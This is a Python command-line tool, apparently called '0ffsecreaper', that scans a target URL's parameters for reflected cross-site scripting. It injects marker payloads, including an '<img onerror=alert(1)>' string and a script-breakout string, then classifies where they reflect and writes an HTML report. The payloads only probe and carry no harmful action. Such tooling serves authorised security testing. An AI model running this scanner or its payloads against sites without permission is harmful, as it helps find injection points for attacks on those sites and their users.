# 0ffsecreaper

import argparse
import random
import string
import threading
import time
import urllib.parse
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from html import escape

import requests
from bs4 import BeautifulSoup


def rand_token(n=6):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(n))


class PayloadGenerator:
    def __init__(self):
        self.base_marker = f"XSSTOKEN_{rand_token(6)}"

    def for_context(self, context: str, suffix: str):
        marker = self.base_marker + suffix

        if context == "attr_name":
            return f"{marker}=1"

        elif context == "attr_value":
            return f'"{marker}"'

        elif context == "text":
            return f"{marker}<img src=x onerror=alert(1)>"

        elif context == "script":
            return f"');console.log('{marker}');//"

        return marker


class ReflectionResult:
    def __init__(self, param, payload, contexts, snippet):
        self.param = param
        self.payload = payload
        self.contexts = contexts
        self.snippet = snippet


class XSSScannerV3:
    def __init__(self, url, params, method="GET", post_data=None,
                 headers=None, cookies=None, threads=6, timeout=10,
                 preserve_query=False):

        self.raw_url = url
        self.parsed = urllib.parse.urlparse(url)
        self.base_url = urllib.parse.urlunparse(
            (self.parsed.scheme, self.parsed.netloc, self.parsed.path, '', '', '')
        )

        self.original_query = urllib.parse.parse_qsl(
            self.parsed.query, keep_blank_values=True
        )

        self.params = params
        self.method = method.upper()
        self.post_data = post_data
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.threads = threads
        self.timeout = timeout
        self.preserve_query = preserve_query

        self.pg = PayloadGenerator()
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.cookies.update(self.cookies)

        self.results = []
        self.lock = threading.Lock()

    def _build_get_params(self, target_param, payload):
        if self.preserve_query and self.original_query:
            q = list(self.original_query)
            new_q = []
            replaced = False

            for k, v in q:
                if k == target_param and not replaced:
                    new_q.append((k, payload))
                    replaced = True
                else:
                    new_q.append((k, v))

            if not replaced:
                new_q.append((target_param, payload))

            return new_q

        return [(target_param, payload)]

    def _make_request(self, target_param, payload):
        try:
            if self.method == "GET":
                params = self._build_get_params(target_param, payload)
                resp = self.session.get(self.base_url, params=params, timeout=self.timeout)
                return resp

            if self.post_data and "__INJECT__" in self.post_data:
                body = self.post_data.replace("__INJECT__", payload)
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                resp = self.session.post(self.base_url, data=body, headers=headers, timeout=self.timeout)
                return resp

            data = {target_param: payload}
            resp = self.session.post(self.base_url, data=data, timeout=self.timeout)
            return resp

        except Exception as e:
            print(f"[!] Request error for {target_param}: {e}")
            return None

    def _classify_contexts(self, resp_text, payload):
        contexts = set()
        snippet = ''

        # Raw reflection
        if payload in resp_text:
            contexts.add("raw")
            idx = resp_text.find(payload)
            snippet = resp_text[max(0, idx-60): idx+len(payload)+60]
            snippet = snippet.replace("\n", " ").replace("\r", " ")

        # JSON detection
        try:
            parsed_json = json.loads(resp_text)
            if payload in json.dumps(parsed_json):
                contexts.add("json")
        except Exception:
            pass

        # HTML parsing
        try:
            soup = BeautifulSoup(resp_text, "html.parser")

            for tag in soup.find_all(True):
                tag_html = str(tag)

                if payload in tag_html:
                    if re.search(re.escape(payload) + r"\s*=", tag_html):
                        contexts.add("attribute-name")

                    if re.search(r"=['\"]([^'\"]*" + re.escape(payload) + r"[^'\"]*)['\"]", tag_html):
                        contexts.add("attribute-value")

                    for text in tag.find_all(string=True):
                        if payload in text:
                            contexts.add("text-node")

                    if tag.name == "script" and tag.string and payload in tag.string:
                        contexts.add("script")

            # Comments
            for comment in soup.find_all(string=lambda t: isinstance(t, type(soup.comment))):
                if payload in str(comment):
                    contexts.add("comment")

        except Exception:
            pass

        return sorted(contexts), snippet

    def _test_param(self, param):
        contexts_to_test = ["attr_name", "attr_value", "text", "script"]

        for ctx in contexts_to_test:
            suffix = "_" + rand_token(4)
            payload = self.pg.for_context(ctx, suffix)

            resp = self._make_request(param, payload)
            if resp is None:
                continue

            resp_text = resp.text

            found_contexts, snippet = self._classify_contexts(resp_text, payload)

            if found_contexts:
                result = ReflectionResult(param, payload, found_contexts, snippet)

                with self.lock:
                    self.results.append(result)

                print(f"[+] Reflection: param={param} ctx={found_contexts}")

    def run(self):
        print(f"Scanning: {self.base_url}  Params={self.params}  Preserve={self.preserve_query}")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._test_param, p) for p in self.params]

            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    print(f"[!] Worker error: {e}")

        print("Scan complete.")

    def generate_report(self, filename="report_v3.html"):
        head = f"""
        <html><head><meta charset='utf-8'>
        <title>XSS Scan Report v3</title>
        <style>
            body {{ font-family: Arial; }}
            table {{ border-collapse: collapse; width: 100%; }}
            td, th {{ border: 1px solid #ccc; padding: 6px; }}
        </style>
        </head><body>
        <h1>Reflected XSS Scan Report (v3)</h1>
        <p>Target: {escape(self.raw_url)}</p>
        <table>
            <tr><th>Parameter</th><th>Payload</th><th>Contexts</th><th>Snippet</th></tr>
        """

        rows = ""
        for r in self.results:
            rows += (
                f"<tr>"
                f"<td>{escape(r.param)}</td>"
                f"<td><code>{escape(r.payload)}</code></td>"
                f"<td>{escape(','.join(r.contexts))}</td>"
                f"<td>{escape(r.snippet)}</td>"
                f"</tr>"
            )

        tail = """
        </table>
        </body></html>
        """

        with open(filename, "w", encoding="utf-8") as f:
            f.write(head + rows + tail)

        print(f"Report saved: {filename}")


def parse_args():
    parser = argparse.ArgumentParser(description="Reflected XSS Scanner v3")

    parser.add_argument("--url", required=True)
    parser.add_argument("--params", required=True)
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--post-data")
    parser.add_argument("--threads", type=int, default=6)
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--preserve-query", action="store_true")

    return parser.parse_args()


def main():
    args = parse_args()
    params = [p.strip() for p in args.params.split(",") if p.strip()]

    scanner = XSSScannerV3(
        url=args.url,
        params=params,
        method=args.method,
        post_data=args.post_data,
        threads=args.threads,
        timeout=args.timeout,
        preserve_query=args.preserve_query
    )

    start = time.time()
    scanner.run()
    duration = time.time() - start

    scanner.generate_report()
    print(f"Finished in {duration:.2f}s — {len(scanner.results)} reflections found.")


if __name__ == "__main__":
    main()

#0ffsecreaper
